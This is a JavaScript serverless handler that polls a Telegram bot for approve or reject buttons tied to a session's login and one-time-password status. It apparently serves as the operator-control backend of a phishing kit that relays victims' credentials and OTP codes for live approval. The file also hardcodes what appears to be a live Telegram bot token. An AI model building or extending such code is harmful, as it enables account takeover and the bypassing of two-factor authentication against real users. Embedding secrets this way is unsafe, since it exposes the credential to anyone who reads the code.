const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8867971085:AAHFHldZq92uowOok2xZOrvN4HNX2DjQYj8';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const { sessionId } = req.query || {};
  if (!sessionId) {
    return res.status(400).json({ error: 'sessionId requis' });
  }

  try {
    const allowedUpdates = encodeURIComponent(JSON.stringify(['message', 'callback_query']));
    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=20&allowed_updates=${allowedUpdates}`);
    const data = await tgRes.json();

    let loginStatus = 'pending';
    let otpStatus = 'idle';

    if (data && data.ok && Array.isArray(data.result)) {
      for (const update of data.result) {
        if (update.callback_query) {
          const cb = update.callback_query.data || '';
          if (cb === `approve_login_${sessionId}`) loginStatus = 'approved';
          if (cb === `reject_login_${sessionId}`) loginStatus = 'rejected';
          if (cb === `approve_otp_${sessionId}`) otpStatus = 'approved';
          if (cb === `reject_otp_${sessionId}`) otpStatus = 'rejected';
        }
      }
    }

    return res.status(200).json({
      exists: true,
      sessionId,
      loginStatus,
      otpStatus,
    });
  } catch (error) {
    return res.status(200).json({
      exists: true,
      sessionId,
      loginStatus: 'pending',
      otpStatus: 'pending',
    });
  }
}
